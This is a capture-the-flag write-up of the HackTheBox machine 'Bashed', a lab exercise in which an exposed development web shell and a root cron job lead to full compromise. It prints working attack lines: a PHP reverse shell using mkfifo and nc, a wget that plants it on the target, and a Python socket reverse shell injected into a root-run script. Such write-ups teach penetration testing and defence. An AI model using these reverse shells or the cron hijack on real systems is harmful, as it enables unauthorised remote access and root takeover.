---
layout: post
title: 'HackTheBox - Bashed'
date: 2018-04-29
author: Casey Mullineaux
cover: '/images/htb/bashed/htb-bashed-01-1.png'
tags: hackthebox
---

_Bashed_ highlights the importance of having a separate environment for development and production.

In this challenge, a developer creating a new web application uses a production web server for the development environment. I demonstrate abusing the artifacts left behind by the developer in order to compromise the system.
    
# Hacking the box

1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a>Enumeration

Starting out with a standard nmap scan, I find website on port 80

```bash
root@kali:~/htb/bashed# nmap -sC -sV -oA bashed 10.10.10.68

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-09 13:18 AEDT
Nmap scan report for 10.10.10.68
Host is up (0.32s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

* **-sC** run default scripts
* **-sV** probe open ports to determine service info
* **-oA** output all formats

I poke around on the website and it looks like a developer blog for something called *phpbash*. I click the only post from a user called **development**, and it gives a little more information on what this phpbash thing is.

![htb-bashed-01](/images/htb/bashed/htb-bashed-01.png)

The image on the blog post shows what looks to be a phpshell located at `/uploads/phpbash.php`. I smack that into my browser, but no luck.

Next I fire up `gobuster` and go hunting for some more directories.

```bash
gobuster -u 10.10.10.68 -w /usr.share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![htb-bashed-02](/images/htb/bashed/htb-bashed-02.png)

I get a couple of hits. Considering the blog post explains that phpbash was developed on this exact machine, I figured the `/dev` directory would be a good place to start.

I browse to `/dev` and hit the jackpot.

![htb-bashed-03](/images/htb/bashed/htb-bashed-03.png)

Loading up `/dev/phpbash.php` gives me an interactive web shell.

![htb-bashed-04](/images/htb/bashed/htb-bashed-04.png)

From here i'm able to quickly grab the user flag located in `/home/arraxel/`
<p class="success">user flag obtained!</p>

# <a name="exploit"></a>Exploitation
To move on, i'm going to want a proper shell.

Referencing once again the trusty [Pentest Monkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), I create myself a quick and dirty php script that'll send a reverse shell, and save as `totallylegit.php`

```php
<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.44 1234 >/tmp/f'); ?>
```

Staring a simple Python webserver allows me to serve the php shell over HTTP.

```bash
python -m SimpleHTTPServer 80
```

In the phpbash shell, I browse to a public readable directory that the `www-data` user can write to - in this case `/var/www/html/uploads` - and download my script to the machine.

```bash
wget 10.10.15.44/totallylegit.php
```

Browsing to `/uploads/totallylegit.php` initiates a shell.

![htb-bashed-05-1](/images/htb/bashed/htb-bashed-05-1.png)

# <a name="privesc"></a> Privilege escalation

I run ```sudo -l``` to see what my current user can do.
```bash
$ sudo -l                                                                                                                 
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

It appears I can run any command as **scriptmanager** without a password. 

I enumerate the system a little, and find `/scripts` is owned by the user **scriptmanager**.

![htb-bashed-06](/images/htb/bashed/htb-bashed-06.png)

Trying to see what's inside the `/scripts` directory, I attempt to give myself a shell as the **scriptmanager**  user - but get an error.

```bash
$ su -u scriptmanager /bin/sh -i
su: must be run from a terminal
```

The `su` command must be run from a terminal; so lets get one.
```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/uploads$ sudo -u scriptmanager /bin/sh -i
sudo -u scriptmanager /bin/sh -i
$ whoami
whoami
scriptmanager
$ 
```

From here I can now access the `/scripts/` directory.

```bash
scriptmanager@bashed:/scripts$ ls -l
ls -l
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 55 Feb  8 19:38 test.py
-rw-r--r-- 1 root          root          12 Feb  8 19:37 test.txt
```

What stands out to me here, is that `test.py` has read/write permissions set for the **scriptmanager** user. 

Let's take a look at the contents of `test.py`
```bash
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

The script itself simply opens a file handler, and writes 'testing 123!' to test.txt. 
The interesting bit is that the resulting `test.txt` is owned by the **root** user. This indicates that `test.py` is being executed by **root** somehow. 

Using the Pentest Cheat Sheet once again, I replace the contents of `test.py` with a python reverse shell.

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.15.44",1337));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Less than a minute later, I get my root shell calling home.

```bash
root@kali:~/htb/bashed# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.15.44] from (UNKNOWN) [10.10.10.68] 58032
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

<p class="success">root flag obtained!</p>

I checked out crontab and discovered why root is executing the `test.py` script.
```bash
# crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
# 
```

There's a cronjob that runs every minute and executes all python scripts in the /scripts directory.

# <a name="deconstruct"></a> Deconstructing the hack

There's not really much to deconstruct in this one. I was able to gain initial access to the remote system by accessing a php shell that was being developed on the machine, and was left externally exposed. 

The key takeaway here is: 
<p class="warning">Don't use your public facing production infrastructure as a development environment!</p>

In a modern world where low-cost cloud infrastructure can be quickly spun up and torn down, and you only pay for what you use, there isn't an excuse for not having a separate environment for developing your software. Keeping production separeate from development can help to ensure buggy code doenst lead to compromise of your network.